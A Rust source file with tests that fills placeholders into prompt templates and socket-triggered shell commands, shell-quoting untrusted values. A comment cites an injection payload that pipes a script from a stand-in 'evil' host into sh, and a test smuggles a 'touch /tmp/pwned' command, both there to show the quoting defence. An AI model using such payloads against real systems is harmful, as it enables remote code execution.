//! Dispatch logic for vigil observances.
//!
//! In `commands` socket mode, the caller provides a command name; this module
//! looks it up in the pre-registered command map and substitutes `{arg_name}`
//! placeholders from the socket payload.
#![allow(dead_code)]

use std::collections::HashMap;

use crate::config::VigilCommand;

use super::types::CoalescedBatch;

/// Substitute vigil context into a prompt template.
///
/// Supported variables:
/// - `{name}` — vigil name
/// - `{files}` — comma-separated changed file paths
/// - `{events}` — comma-separated event kinds
/// - `{event_count}` — number of events in this reap window
/// - `{timestamp}` — ISO 8601 reap time
/// - `{rite_output}` — stdout+stderr from rite command
/// - `{rite_exit_code}` — exit code from rite command
/// - `{harbinger_data}` — raw socket payload (first connection in window)
/// - Any `{key}` matching a string field in the merged event context objects
pub fn build_prompt(template: &str, batch: &CoalescedBatch) -> String {
    let mut result = template.to_string();

    let files = batch.files.join(", ");
    let event_types: Vec<&str> = batch
        .events
        .iter()
        .filter_map(|e| e.get("kind").and_then(|v| v.as_str()))
        .collect();
    let events = event_types.join(", ");
    let timestamp = batch.timestamp.to_rfc3339();
    let rite_output = batch.rite_output.as_deref().unwrap_or("");
    let rite_exit_code = batch
        .rite_exit_code
        .map_or(String::new(), |c| c.to_string());
    let harbinger_data = batch.harbinger_data.as_deref().unwrap_or("");

    result = result.replace("{name}", &batch.vigil_name);
    result = result.replace("{files}", &files);
    result = result.replace("{events}", &events);
    result = result.replace("{event_count}", &batch.event_count.to_string());
    result = result.replace("{timestamp}", &timestamp);
    result = result.replace("{rite_output}", rite_output);
    result = result.replace("{rite_exit_code}", &rite_exit_code);
    result = result.replace("{harbinger_data}", harbinger_data);

    // Substitute any remaining {key} placeholders from merged event context
    for event in batch.events.iter().rev() {
        if let serde_json::Value::Object(map) = event {
            for (key, val) in map {
                if key == "kind" || key == "harbinger_data" || key == "files" {
                    continue;
                }
                let val_str = match val {
                    serde_json::Value::String(s) => s.clone(),
                    other => other.to_string(),
                };
                result = result.replace(&format!("{{{}}}", key), &val_str);
            }
        }
    }

    result
}

/// Dispatch a named command from the pre-registered map.
/// Substitutes `{arg_name}` string templates in argument values from the payload.
pub fn dispatch_commands(
    commands: &HashMap<String, VigilCommand>,
    command_name: &str,
    payload: &serde_json::Value,
) -> Result<(String, serde_json::Map<String, serde_json::Value>), String> {
    let cmd = commands
        .get(command_name)
        .ok_or_else(|| format!("unknown command: {command_name}"))?;

    let mut resolved_args = serde_json::Map::new();
    for (key, val) in &cmd.args {
        let resolved = resolve_templates(val, payload);
        resolved_args.insert(key.clone(), resolved);
    }

    Ok((cmd.tool.clone(), resolved_args))
}

fn resolve_templates(value: &serde_json::Value, payload: &serde_json::Value) -> serde_json::Value {
    match value {
        serde_json::Value::String(s) => {
            let resolved = substitute_placeholders(s, payload);
            serde_json::Value::String(resolved)
        }
        serde_json::Value::Object(map) => {
            let mut new_map = serde_json::Map::new();
            for (k, v) in map {
                new_map.insert(k.clone(), resolve_templates(v, payload));
            }
            serde_json::Value::Object(new_map)
        }
        _ => value.clone(),
    }
}

/// Single-quote a substituted value so it stays inert when the resolved
/// command string is handed to `sh -c` in the reaper. Substitution values are
/// untrusted (they arrive over a socket payload), so a bare splice is a
/// command-injection vector: `{message}` → `'; curl http://evil/x.sh | sh; echo '`.
fn shell_quote(s: String) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

fn substitute_placeholders(template: &str, payload: &serde_json::Value) -> String {
    let mut result = template.to_string();
    if let serde_json::Value::Object(map) = payload {
        let args = map.get("args");
        let source = args.unwrap_or(payload);

        if let serde_json::Value::Object(source_map) = source {
            // Find patterns like {arg_name} and substitute from source_map
            let mut start = 0;
            while let Some(brace_start) = result[start..].find('{') {
                let abs_start = start + brace_start;
                if let Some(brace_end) = result[abs_start..].find('}') {
                    let abs_end = abs_start + brace_end;
                    let key = &result[abs_start + 1..abs_end];
                    if let Some(val) = source_map.get(key) {
                        let raw = match val {
                            serde_json::Value::String(s) => s.clone(),
                            other => other.to_string(),
                        };
                        let replacement = shell_quote(raw);
                        result.replace_range(abs_start..=abs_end, &replacement);
                        start = abs_start + replacement.len();
                    } else {
                        start = abs_end + 1;
                    }
                } else {
                    break;
                }
            }
        }
    }
    result
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::extras::vigil::types::TriggerKind;
    use serde_json::json;

    fn make_commands() -> HashMap<String, VigilCommand> {
        let mut map = HashMap::new();
        map.insert(
            "build".to_string(),
            VigilCommand {
                tool: "bash".to_string(),
                args: {
                    let mut args = serde_json::Map::new();
                    args.insert(
                        "command".to_string(),
                        serde_json::Value::String("cargo build {release_flag}".to_string()),
                    );
                    args
                },
            },
        );
        map
    }

    #[test]
    fn test_dispatch_known_command() {
        let commands = make_commands();
        let payload = json!({"command": "build", "args": {"release_flag": "--release"}});
        let result = dispatch_commands(&commands, "build", &payload).unwrap();
        assert_eq!(result.0, "bash");
        assert_eq!(
            result.1.get("command").unwrap().as_str().unwrap(),
            "cargo build '--release'"
        );
    }

    #[test]
    fn test_dispatch_shell_quotes_injected_values() {
        let commands = make_commands();
        let payload =
            json!({"command":"build","args":{"release_flag":"--release; touch /tmp/pwned"}});
        let result = dispatch_commands(&commands, "build", &payload).unwrap();
        assert_eq!(
            result.1.get("command").unwrap().as_str().unwrap(),
            "cargo build '--release; touch /tmp/pwned'"
        );
    }

    #[test]
    fn test_dispatch_unknown_command() {
        let commands = make_commands();
        let payload = json!({"command": "delete_everything"});
        assert!(dispatch_commands(&commands, "delete_everything", &payload).is_err());
    }

    #[test]
    fn test_substitute_missing_key_leaves_placeholder() {
        let commands = make_commands();
        let payload = json!({"command": "build", "args": {}});
        let result = dispatch_commands(&commands, "build", &payload).unwrap();
        assert_eq!(
            result.1.get("command").unwrap().as_str().unwrap(),
            "cargo build {release_flag}"
        );
    }

    #[test]
    fn test_build_prompt_substitutes_variables() {
        let batch = CoalescedBatch {
            vigil_name: "test-vigil".to_string(),
            files: vec!["src/main.rs".to_string()],
            events: vec![json!({"kind": "toll"})],
            event_count: 3,
            timestamp: chrono::DateTime::parse_from_rfc3339("2026-01-15T12:00:00Z")
                .unwrap()
                .with_timezone(&chrono::Utc),
            trigger: TriggerKind::Toll,
            rite_output: Some("rite output".to_string()),
            rite_exit_code: Some(0),
            harbinger_data: None,
        };
        let template = "[{name}] {event_count} events on {files} ({events}) - {timestamp}";
        let result = build_prompt(template, &batch);
        assert_eq!(
            result,
            "[test-vigil] 3 events on src/main.rs (toll) - 2026-01-15T12:00:00+00:00"
        );
    }

    #[test]
    fn test_build_prompt_empty_template_returns_empty() {
        let batch = CoalescedBatch {
            vigil_name: "v".to_string(),
            files: vec![],
            events: vec![],
            event_count: 0,
            timestamp: chrono::Utc::now(),
            trigger: TriggerKind::Toll,
            rite_output: None,
            rite_exit_code: None,
            harbinger_data: None,
        };
        let template = "";
        let result = build_prompt(template, &batch);
        assert_eq!(result, "");
    }

    #[test]
    fn test_build_prompt_substitutes_event_context_fields() {
        let batch = CoalescedBatch {
            vigil_name: "jenkins-remediate".to_string(),
            trigger: TriggerKind::Toll,
            files: vec![],
            events: vec![json!({
                "kind": "toll",
                "job": "my-pipeline",
                "build_number": "42",
                "url": "http://jenkins:8080/job/my-pipeline/42",
                "status": "FAILURE"
            })],
            event_count: 1,
            timestamp: chrono::Utc::now(),
            rite_output: None,
            rite_exit_code: None,
            harbinger_data: None,
        };
        let template = "Job: {job}\nBuild: #{build_number}\nURL: {url}\nStatus: {status}";
        let result = build_prompt(template, &batch);
        assert_eq!(
            result,
            "Job: my-pipeline\nBuild: #42\nURL: http://jenkins:8080/job/my-pipeline/42\nStatus: FAILURE"
        );
    }
}
